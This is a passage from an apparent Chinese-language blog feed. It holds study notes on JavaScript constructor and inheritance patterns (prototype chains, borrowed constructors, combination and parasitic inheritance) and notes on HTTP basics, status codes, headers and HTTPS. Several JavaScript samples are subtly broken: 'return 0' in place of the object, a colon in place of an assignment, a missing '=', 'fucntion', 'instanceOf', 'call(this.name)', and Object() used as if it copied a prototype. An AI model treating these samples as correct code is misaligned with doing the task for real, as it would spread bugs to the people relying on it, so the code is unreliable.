&#125;;</span><br><span class="line">    return values;</span><br><span class="line">&#125;</span><br><span class="line">var colors = new SpecialArray(&quot;red&quot;,&quot;blue&quot;,&quot;green&quot;);</span><br><span class="line">alert(colors.toPipedString());    //&quot;red|blue|green&quot;</span><br></pre></td></tr></table></figure><h3 id="稳妥构造函数模式"><a href="#稳妥构造函数模式" class="headerlink" title="稳妥构造函数模式"></a>稳妥构造函数模式</h3><p>稳妥对象最适合在一些安全的环境中（这些环境中会禁止使用this和new）或者防止数据被其他应用程序（如Mashup程序）改动时使用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function Person(name,age,job)&#123;</span><br><span class="line">    var o = new Object();</span><br><span class="line">    o.sayName = function()&#123;</span><br><span class="line">        alert(name);    //name只能通过sayName方法访问</span><br><span class="line">    &#125;;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h2><h3 id="原型链"><a href="#原型链" class="headerlink" title="原型链"></a>原型链</h3><p>实现原型链的基本模式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">function SuperType()&#123;</span><br><span class="line">    this.property = true;</span><br><span class="line">&#125;</span><br><span class="line">SuperType.prototype.getSuperValue = function()&#123;</span><br><span class="line">    return this.property;</span><br><span class="line">&#125;;</span><br><span class="line">function SubType()&#123;</span><br><span class="line">    this.subproperty = false;</span><br><span class="line">&#125;</span><br><span class="line">SubType.prototype = new SuperType();</span><br><span class="line">SubType.prototype.getSubValue = function()&#123;</span><br><span class="line">    return this.subproperty;</span><br><span class="line">&#125;;</span><br><span class="line">var instance = new SubType();</span><br><span class="line">alert(instance.getSuperValue());   //true</span><br></pre></td></tr></table></figure><p><img src="../assets/jsoop/20190324225152.png" alt="Alt text"></p><p>以上代码中，可用instanceof和isPrototypeOf来确定原型和实例之间的关系</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">alert(instance instanceOf Object);   //true</span><br><span class="line">alert(instance instanceOf SuperType);   //true</span><br><span class="line">alert(instance instanceOf SubType);   //true</span><br><span class="line">alert(Object.prototype.isPrototypeOf(instance));   //true</span><br></pre></td></tr></table></figure><p>通过原型链实现继承时，不能使用对象字面量创建原型方法，因为这样会重写原型链，原型链中存在问题，包含引用类型值的原型属性会被所有实例共享</p><h3 id="借用构造函数"><a href="#借用构造函数" class="headerlink" title="借用构造函数"></a>借用构造函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">function SuperType()&#123;</span><br><span class="line">    this.colors: [&quot;red&quot;,&quot;blue&quot;,&quot;green&quot;];</span><br><span class="line">&#125;</span><br><span class="line">function SubType()&#123;</span><br><span class="line">    SuperType.call(this);   //执行了SuperType中定义的所有对象初始化代码</span><br><span class="line">&#125;</span><br><span class="line">var instance1 = new SubType();</span><br><span class="line">instance1.colors.push(&quot;black&quot;);</span><br><span class="line">alert(instance1.colors);   //&quot;red,blue,green,black&quot;</span><br><span class="line">var instance2 = new SubType();</span><br><span class="line">alert(instance2.colors);   //&quot;red,blue,green&quot;</span><br><span class="line"></span><br><span class="line">// 还可以传递参数</span><br><span class="line">function SuperType(name)&#123;</span><br><span class="line">    this.name = name;</span><br><span class="line">&#125;</span><br><span class="line">function SubType()&#123;</span><br><span class="line">    SuperType.call(this,&quot;Nicholas&quot;);</span><br><span class="line">    this.age = 29;</span><br><span class="line">&#125;</span><br><span class="line">var instance = new SubType();</span><br><span class="line">alert(instance.name);   //&quot;Nicholas&quot;</span><br><span class="line">alert(instance.age);   //29</span><br></pre></td></tr></table></figure><p>如同仅仅借用构造函数，则无法函数复用</p><h3 id="组合继承"><a href="#组合继承" class="headerlink" title="组合继承"></a>组合继承</h3><p>使用原型链实现对原型属性和方法的继承，通过借用构造函数实现对实例的继承</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">function SuperType(name)&#123;</span><br><span class="line">    this.name = name;</span><br><span class="line">    this.colors = [&quot;red&quot;,&quot;blue&quot;,&quot;green&quot;];</span><br><span class="line">&#125;</span><br><span class="line">SuperType.prototype.sayName = function()&#123;</span><br><span class="line">    alert(this.name);</span><br><span class="line">&#125;</span><br><span class="line">function SubType(name,age)&#123;</span><br><span class="line">    SuperType.call(this,name);    //继承属性</span><br><span class="line">    this.age = age;</span><br><span class="line">&#125;</span><br><span class="line">SubType.prototype = new SuperType();   //继承方法</span><br><span class="line">SubType.prototype.constructor = SubType;</span><br><span class="line">SubType.prototype.sayAge = function()&#123;</span><br><span class="line">    alert(this.age);</span><br><span class="line">&#125;;</span><br><span class="line">var instance1 = new SubType(&quot;Nicholas&quot;,29);</span><br><span class="line">instance1.colors.push(&quot;black&quot;);</span><br><span class="line">alert(instance1.colors);   //&quot;red,blue,green,black&quot;</span><br><span class="line">instance1.sayName();   //&quot;Nicholas&quot;</span><br><span class="line">instance1.sayAge();   //29</span><br><span class="line">var instance2 = new SubType(&quot;Greg&quot;,27);</span><br><span class="line">alert(instance2.colors);   //&quot;red,blue,green&quot;</span><br><span class="line">instance2.sayName();   //&quot;Greg&quot;</span><br><span class="line">instance2.sayAge();   //27</span><br></pre></td></tr></table></figure><h3 id="原型式继承"><a href="#原型式继承" class="headerlink" title="原型式继承"></a>原型式继承</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">var person = &#123;</span><br><span class="line">    name: &quot;Nicholas&quot;,</span><br><span class="line">    friends: [&quot;Shelby&quot;,&quot;Court&quot;,&quot;Van&quot;]</span><br><span class="line">&#125;;</span><br><span class="line">var anotherPerson  Object(person);</span><br><span class="line">anotherPerson.name = &quot;Greg&quot;;</span><br><span class="line">anotherPerson.friends.push(&quot;Rob&quot;);</span><br><span class="line">var getAnotherPerson = Object(person);</span><br><span class="line">getAnotherPerson.name = &quot;Linda&quot;;</span><br><span class="line">getAnotherPerson.friends.push(&quot;Barbie&quot;);</span><br><span class="line">alert(person.friends);   //&quot;Shelby,Court,Van,Rob,Barbie&quot;</span><br></pre></td></tr></table></figure><p>ES5新增Object.create()方法规范化了原型式继承，在传入一个参数时与Object方法相同</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var person = &#123;</span><br><span class="line">    name: &quot;Nicholas&quot;,</span><br><span class="line">    friends: [&quot;Shelby&quot;,&quot;Court&quot;,&quot;Van&quot;]</span><br><span class="line">&#125;;</span><br><span class="line">var anotherPerson = Object.create(person,&#123;</span><br><span class="line">    name: &#123;</span><br><span class="line">        value: &quot;Greg&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line">alert(anotherPerson.name);   //&quot;Greg&quot;</span><br></pre></td></tr></table></figure><h3 id="寄生式继承"><a href="#寄生式继承" class="headerlink" title="寄生式继承"></a>寄生式继承</h3><p>创建一个仅用于封装继承过程的函数，该函数在内部以某种方式来增强对象</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function createAnother(original)&#123;</span><br><span class="line">    var clone = Object(original);   //创建一个新对象，Object函数不是必需的</span><br><span class="line">    clone.sayHi = function()&#123;</span><br><span class="line">        alert(&quot;Hi&quot;);</span><br><span class="line">    &#125;;</span><br><span class="line">    return clone;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="寄生组合继承"><a href="#寄生组合继承" class="headerlink" title="寄生组合继承"></a>寄生组合继承</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">fucntion inheritP(subType,superType)&#123;</span><br><span class="line">    var prototype = Object(superType.prototype);</span><br><span class="line">    prototype.constructor = subType;</span><br><span class="line">    subType.prototype = prototype;</span><br><span class="line">&#125;</span><br><span class="line">function SuperType(name)&#123;</span><br><span class="line">    this.name = name;</span><br><span class="line">    this.colors = [&quot;red&quot;,&quot;blue&quot;,&quot;green&quot;];</span><br><span class="line">&#125;</span><br><span class="line">SuperType.prototype.sayName = function()&#123;</span><br><span class="line">    alert(this.name);</span><br><span class="line">&#125;;</span><br><span class="line">function SubType(name,age)&#123;</span><br><span class="line">    SuperType.call(this.name);</span><br><span class="line">    this.age = age;</span><br><span class="line">&#125;</span><br><span class="line">inheritP(SubType,SuperType);</span><br><span class="line">SubType.prototype.sayAge = function()&#123;</span><br><span class="line">    alert(this.age);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;属性类型&quot;&gt;&lt;a href=&quot;#属性类型&quot; class=&quot;headerlink&quot; title=&quot;属性类型&quot;&gt;&lt;/a&gt;属性类型&lt;/h2&gt;&lt;h3 id=&quot;数据属性&quot;&gt;&lt;a href=&quot;#数据属性&quot; class=&quot;headerlink&quot; title=&quot;数据属性&quot;&gt;&lt;/a&gt;数据属性&lt;/h3&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&quot;text-align:left&quot;&gt;属性名&lt;/th&gt;
&lt;th style=&quot;text-align:left&quot;&gt;解释&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:left&quot;&gt;[[Configurable]]&lt;/td&gt;
&lt;td style=&quot;text-align:left&quot;&gt;表示能否通过delete删除属性从而重新定义属性，默认为true&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:left&quot;&gt;[[Enumerable]]&lt;/td&gt;
&lt;td style=&quot;text-align:left&quot;&gt;表示能否通过for-in循环返回属性，默认为true&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:left&quot;&gt;[[Writable]]&lt;/td&gt;
&lt;td style=&quot;text-align:left&quot;&gt;表示能否修改属性的值，默认为true&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&quot;text-align:left&quot;&gt;[[Value]]&lt;/td&gt;
&lt;td style=&quot;text-align:left&quot;&gt;包含这个属性的数值，默认为undefined&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;var person = &amp;#123;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Object.defineProperty(person,&amp;quot;name&amp;quot;,&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    writable: false,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    value: &amp;quot;Nicholas&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;alert(person.name);  // &amp;quot;Nicholas&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;person.name = &amp;quot;Greg&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;alert(person.name);  // &amp;quot;Nicholas&amp;quot;,通过修改属性使之不能被修改&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="前端" scheme="http://dangoying.ink/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="前端" scheme="http://dangoying.ink/tags/%E5%89%8D%E7%AB%AF/"/>
    
  </entry>
  
  <entry>
    <title>HTTP原理</title>
    <link href="http://dangoying.ink/HTTP%E5%8E%9F%E7%90%86.html"/>
    <id>http://dangoying.ink/HTTP原理.html</id>
    <published>2019-01-17T14:03:18.000Z</published>
    <updated>2019-01-28T14:59:25.211Z</updated>
    
    <content type="html"><![CDATA[<h2 id="TCP-IP协议族"><a href="#TCP-IP协议族" class="headerlink" title="TCP/IP协议族"></a>TCP/IP协议族</h2><h3 id="重要思想-分层"><a href="#重要思想-分层" class="headerlink" title="重要思想:分层"></a>重要思想:<code>分层</code></h3><h3 id="分层："><a href="#分层：" class="headerlink" title="分层："></a>分层：</h3><ul><li>应用层：<blockquote><p>HTTP协议：生成针对目标web服务器的HTTP请求报文。<br>FTP协议：文件传输协议。<br>DNS协议： 域名解析协议。</p></blockquote></li></ul><a id="more"></a><ul><li>传输层：<blockquote><p>UDP协议：用户数据报协议。<br>TCP协议：传输控制协议：利用三次握手策略。<br><img src="../assets/http/tcp3handmake.gif" alt="Alt text"></p></blockquote></li></ul><ul><li><p>网络层:</p><blockquote><p>IP协议：把各种数据包传送给对方。<br>ARP协议：解析地址协议，通过IP地址查出对应MAC地址。</p></blockquote></li><li><p>链路层：用于处理网络的硬件部分。</p></li></ul><h2 id="URI-URL"><a href="#URI-URL" class="headerlink" title="URI/URL"></a>URI/URL</h2><ul><li>URI：用字符串标识某一互联网资源。</li><li>URL： 互联网上所处的位置表示资源地点。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://user:pass@wwww.example.com:80/dir/index.html?uid=1#ch1</span><br></pre></td></tr></table></figure></li></ul><table><thead><tr><th style="text-align:center">组成</th><th style="text-align:center">解释</th></tr></thead><tbody><tr><td style="text-align:center">https</td><td style="text-align:center">协议方案</td></tr><tr><td style="text-align:center">user:pass</td><td style="text-align:center">登录信息</td></tr><tr><td style="text-align:center">wwww.example.com</td><td style="text-align:center">服务器地址</td></tr><tr><td style="text-align:center">:80</td><td style="text-align:center">端口号</td></tr><tr><td style="text-align:center">dir/index.html</td><td style="text-align:center">文件路径</td></tr><tr><td style="text-align:center">uid=1</td><td style="text-align:center">查询字符串</td></tr><tr><td style="text-align:center">#ch1</td><td style="text-align:center">片段标识符</td></tr></tbody></table><h2 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h2><h3 id="请求响应："><a href="#请求响应：" class="headerlink" title="请求响应："></a>请求响应：</h3><ul><li><p>请求报文：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST    /from/entry   HTTP/1.1</span><br><span class="line">Host: hacker.jp</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 16</span><br><span class="line">name: ueno&amp;age=37</span><br></pre></td></tr></table></figure></li><li><p>响应报文：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1  200  OK</span><br><span class="line">Date: Tue, 10 Jul 2012 06:50:15 GMT</span><br><span class="line">Content-Length: 362</span><br><span class="line">Content-Type: text/html</span><br><span class="line">&lt;html&gt; ......</span><br></pre></td></tr></table></figure></li></ul><h3 id="HTTP可使用方法："><a href="#HTTP可使用方法：" class="headerlink" title="HTTP可使用方法："></a>HTTP可使用方法：</h3><ul><li>GET：获取资源，目的是获取响应的主体内容。</li><li>POST：传输实体主体。</li><li>PUT：传输文件，要求在请求报文中包含文件内容，保存到请求URI指定位置。</li><li>HEAD：获取报文首部，用于确认URI有效性及资源更新的日期时间。</li><li>DELETE：删除文件，删除URI指定资源。</li><li>OPTIONS：询问支持的方法，查询针对请求URI指定资源支持的方法。</li><li>TRACE：追踪路径，用来确认连接过程中发生的一系列操作。</li><li>CONNECT：要求用隧道协议连接代理。</li></ul><h3 id="状态码："><a href="#状态码：" class="headerlink" title="状态码："></a>状态码：</h3><ul><li>状态码类别：</li></ul><table><thead><tr><th style="text-align:center">状态码</th><th style="text-align:center">分类</th><th style="text-align:center">解释</th></tr></thead><tbody><tr><td style="text-align:center">1xx</td><td style="text-align:center">Infromational(信息性状态码)</td><td style="text-align:center">接收的请求正在处理</td></tr><tr><td style="text-align:center">2xx</td><td style="text-align:center">Success(成功状态码)</td><td style="text-align:center">请求正常处理完成</td></tr><tr><td style="text-align:center">3xx</td><td style="text-align:center">Redirectiion(重定向状态码)</td><td style="text-align:center">需要进行附加操作以完成请求</td></tr><tr><td style="text-align:center">4xx</td><td style="text-align:center">Client Error(客户端错误状态码)</td><td style="text-align:center">服务器无法处理请求</td></tr><tr><td style="text-align:center">5xx</td><td style="text-align:center">Server Error(服务器错误状态码)</td><td style="text-align:center">服务器处理请求出错</td></tr></tbody></table><ul><li>常用状态码：</li></ul><table><thead><tr><th style="text-align:left">状态码</th><th style="text-align:left">解释</th></tr></thead><tbody><tr><td style="text-align:left">200 OK</td><td style="text-align:left">从客户端发来的请求在服务端被正常处理了</td></tr><tr><td style="text-align:left">204 No Content</td><td style="text-align:left">服务器接受的请求已成功处理，但返回的响应报文不含实体主体</td></tr><tr><td style="text-align:left">206 Partial Content</td><td style="text-align:left">客户端进行了范围请求</td></tr><tr><td style="text-align:left">301 Moved Permanently</td><td style="text-align:left">永久性重定向</td></tr><tr><td style="text-align:left">302 Found</td><td style="text-align:left">临时性重定向，请求的资源已被分配了新的URI</td></tr><tr><td style="text-align:left">303 See Other</td><td style="text-align:left">与302有着相同功能，但明确要求采用GET获取资源</td></tr><tr><td style="text-align:left">304 Not Modified</td><td style="text-align:left">客户端发送附带条件请求时，服务端允许请求访问，但未满足条件</td></tr><tr><td style="text-align:left">307 Temporary Redirect</td><td style="text-align:left">与302有相同含义，但不会使POST变成GET</td></tr><tr><td style="text-align:left">400 Bad Request</td><td style="text-align:left">请求报文种存在语法错误</td></tr><tr><td style="text-align:left">401 Unauthorized</td><td style="text-align:left">需通过HTTP认证，若已进行过一次请求，则表示认证失败</td></tr><tr><td style="text-align:left">403 Forbidden</td><td style="text-align:left">请求资源的访问被服务器拒绝</td></tr><tr><td style="text-align:left">404 Not Found</td><td style="text-align:left">服务器上无法找到请求的资源</td></tr><tr><td style="text-align:left">500 Internal Server Error</td><td style="text-align:left">服务器端在执行请求时发生了错误</td></tr><tr><td style="text-align:left">503 Service Unavailable</td><td style="text-align:left">服务器暂处于超负载或正在进行停机维护，无法处理请求</td></tr></tbody></table><h3 id="通信数据转发程序："><a href="#通信数据转发程序：" class="headerlink" title="通信数据转发程序："></a>通信数据转发程序：</h3><h4 id="代理："><a href="#代理：" class="headerlink" title="代理："></a>代理：</h4><ul><li>作用：接收由客户端发送的请求并转发给服务器，接收服务器相应转发给客户端，转发时，需要附加Via首部字段以标记出经过的主机信息。</li><li>使用理由：<blockquote><p>利用缓存技术减少网络带宽的流量<br>组织内部针对特定网站的访问控制<br>以获取访问日志为主要目的</p></blockquote></li><li>分类：<blockquote><p>缓存代理：会预先将资源的副本保存在代理服务器<br>透明代理：不对报文做任何加工的代理类型为透明代理</p></blockquote></li></ul><h4 id="网关："><a href="#网关：" class="headerlink" title="网关："></a>网关：</h4><ul><li>作用：工作机制和代理十分相似，而网关能使通信线路上的服务器提供非HTTP协议。</li></ul><h4 id="隧道："><a href="#隧道：" class="headerlink" title="隧道："></a>隧道：</h4><ul><li>作用：建立一条与其他服务器通信的线路，确保客户端能与服务器进行安全的通信。</li></ul><h3 id="HTTP首部字段："><a href="#HTTP首部字段：" class="headerlink" title="HTTP首部字段："></a>HTTP首部字段：</h3><h4 id="类型："><a href="#类型：" class="headerlink" title="类型："></a>类型：</h4><ul><li>通用首部字段：请求报文和响应报文两方都会使用的首部</li><li>请求首部字段：请求报文使用的首部</li><li>响应首部字段：响应报文使用的首部</li><li>实体首部字段：补充了资源内容更新时间等实体有关的信息</li></ul><h4 id="End-to-end首部和Hop-to-hop首部："><a href="#End-to-end首部和Hop-to-hop首部：" class="headerlink" title="End-to-end首部和Hop-to-hop首部："></a>End-to-end首部和Hop-to-hop首部：</h4><ul><li>端到端首部(End-to-end)：分在此类的首部会转发给请求/想一个的最终接受目标。</li><li>逐跳首部(Hop-to-hop)：分在此类的首部支队单词转发有效，会因通过缓存代理不转发。</li></ul><h4 id="通用首部字段："><a href="#通用首部字段：" class="headerlink" title="通用首部字段："></a>通用首部字段：</h4><ul><li>Cache-Control：操作缓存的工作机制</li><li>Connection：控制不再转发给代理的首部字段，管理持久连接</li><li>Date：表明创建HTTP报文的日期和时间</li><li>Pragma：要求所有的中间服务器不返回缓存的资源</li><li>Trailer：事先说明在报文主体后记录了哪些首部字段，可应用于分块传输编码</li><li>Upgrade：用于检测HTTP协议及其协议是否可使用更高的版本进行通信</li><li>Via：追踪客户端与服务器之间的请求和响应报文的传输路径</li><li>Warning:HTTP/1.0：响应首部演变过来，通常会告知用户一些与缓存相关的问题的警告</li></ul><h4 id="请求首部字段："><a href="#请求首部字段：" class="headerlink" title="请求首部字段："></a>请求首部字段：</h4><ul><li>Accept：通知服务器用户代理可处理的媒体类型及媒体类型的相对优先级顺序</li><li>Accept-Charset：通知服务器用户代理支持的字符集及字腹肌的相对优先级顺序</li><li>Accept-Encoding：通知服务器用户代理支持的内容编码及内容编码的相对优先级顺序</li><li>Accept-Language：通知服务器用户代理支持的自然语言集及其相对优先级顺序</li><li>Authorization：通知服务器用户代理的认证信息</li><li>Expect：期望出现某种特定行为，服务器无法理解作出回应时，返回417 Expectation Failed</li><li>From：使用用户代理的用户的电子邮件地址</li><li>Host：请求资源所处的互联网主机名和端口号</li><li>If-Match：匹配资源所用的实体标记值</li><li>If-Modified-Since：请求指定日期后更新过的资源</li><li>If-None-Match：当实体标记(Etag)与请求资源的Etag不一致时，处理请求</li><li>If-range：If-range字段值若是和Etag值的更新日期时间一致，则做范围请求处理</li><li>If-Unmodified-Since：请求在指定日期后未发生更新的资源</li><li>Max-Forwards：指定可经过的服务器最大数目</li><li>Proxy-Authorization：通知服务器认证所需要的信息</li><li>Range：通知服务器资源的指定范围</li><li>Referer：通知服务器请求的原始资源的URI</li><li>TE：通知服务器客户端能够处理响应的传输编码方式及其相对优先级顺序</li><li>User-Agent：将创建请求的浏览器和用户代理名称等信息传输给服务器</li></ul><h4 id="响应首部字段："><a href="#响应首部字段：" class="headerlink" title="响应首部字段："></a>响应首部字段：</h4><ul><li>Accept-Ranges：用来告知客户端服务器是否能处理范围请求</li><li>Age：告知客户端源服务器在多久前创建了响应，单位为妙</li><li>Etag：告知客户端实体标记，可将资源以字符串形式做唯一性标识的方式</li><li>Location：将响应接收方引导至某个与请求URI位置不同的资源</li><li>Proxy-Authenticate：把由代理服务器所要求的的认证信息发送给客户端</li><li>Retry-After：告知客户端在多久之后再次发送请求</li><li>Server：告知客户端当前服务器上安装的HTTP服务器应用程序的信息</li><li>Vary：可对缓存进行控制</li><li>www-Authenticate：告知客户端适用于访问请求URI所指定资源的认证方案</li></ul><h4 id="实体首部字段："><a href="#实体首部字段：" class="headerlink" title="实体首部字段："></a>实体首部字段：</h4><ul><li>Allow：通知客户端能够支持Request-URI制定资源的所有HTTP方法</li><li>Content-Encoding：告知客户端服务器对实体的主体部分选用的内容编码方式</li><li>Content-Language：告知客户端实体主体使用的自然语言</li><li>Content-Length：表明了实体主体部分的大小</li><li>Content-Location：与报文主体部分相对应的URI</li><li>Content-MD5：检查报文主体在传输过程中是否保持完整，以及确认传输到达</li><li>Content-Range：告知客户端作为响应返回的实体的哪个部分符合范围请求</li><li>Content-Type：说明了实体主体内对象的媒体类型</li><li>Expires：将资源失效的日期告知客户端</li><li>Last-Modified：指明资源最终修改的时间</li></ul><h4 id="为Cookie服务的首部字段："><a href="#为Cookie服务的首部字段：" class="headerlink" title="为Cookie服务的首部字段："></a>为Cookie服务的首部字段：</h4><ul><li><p>Set-Cookie：</p><blockquote><p>expires属性：指定浏览器可发送Cookie的有效期<br>path属性：限制指定Cookie的发送范围的文件目录<br>domain属性：作为Cookie适用对象的域名<br>secure属性：仅在HTTPS安全通信时才会发送Cookie<br>HttpOnly属性：加以限制，使Cookie不能被JavaScript脚本访问</p></blockquote></li><li><p>Cookie：当客户想获得HTTP状态管理支持时，就会在请求中包含从服务器接受的Cookie</p></li></ul><h4 id="其他首部字段："><a href="#其他首部字段：" class="headerlink" title="其他首部字段："></a>其他首部字段：</h4><ul><li>X-Frame-Options：用于控制网站内容在其他Web网站的Frame标签内的现实问题，防止点击劫持攻击</li><li>X-XSS-Protection：针对跨站脚本攻击(XSS)的一种对策，用于控制浏览器XSS防护机制的开关</li><li>DNT：意为拒绝个人信息被收集，表示拒绝被精准广告追踪的一种方法</li><li>P3P：利用P3P技术让Web网站上的个人隐私变成一种仅供程序可理解的形式</li></ul><h2 id="HTTP和HTTPS"><a href="#HTTP和HTTPS" class="headerlink" title="HTTP和HTTPS"></a>HTTP和HTTPS</h2><h3 id="HTTP的缺点："><a href="#HTTP的缺点：" class="headerlink" title="HTTP的缺点："></a>HTTP的缺点：</h3><ul><li>通信使用明文(不加密)，内容可能会被窃听</li><li>不验证通信方的身份，因此有可能遭遇伪装</li><li>无法证明报文的完整性，所以有可能已遭篡改</li></ul><h3 id="HTTPS："><a href="#HTTPS：" class="headerlink" title="HTTPS："></a>HTTPS：</h3><h4 id="定义："><a href="#定义：" class="headerlink" title="定义："></a>定义：</h4><ul><li>HTTPS实在HTTP通信接口部分用SSL和TLS协议代替</li><li>添加了加密及认证机制的HTTP成为HTTPS</li></ul><h4 id="安全通信机制："><a href="#安全通信机制：" class="headerlink" title="安全通信机制："></a>安全通信机制：</h4><p><img src="../assets/http/httpsProcess.jpg" alt="Alt text"></p><h3 id="HTTP认证："><a href="#HTTP认证：" class="headerlink" title="HTTP认证："></a>HTTP认证：</h3><ul><li>Basic认证：采用Base64编码，发送明文密码</li><li>Digest认证：使用质询/响应方式</li><li>SSL客户端认证：借由HTTPS的客户端证书完成认证</li><li>基于表单认证：最常用，并用Cookie来管理Session会话</li></ul><h2 id="基于HTTP的功能追加协议"><a href="#基于HTTP的功能追加协议" class="headerlink" title="基于HTTP的功能追加协议"></a>基于HTTP的功能追加协议</h2><h3 id="SPDY"><a href="#SPDY" class="headerlink" title="SPDY"></a>SPDY</h3><h4 id="HTTP的瓶颈："><a 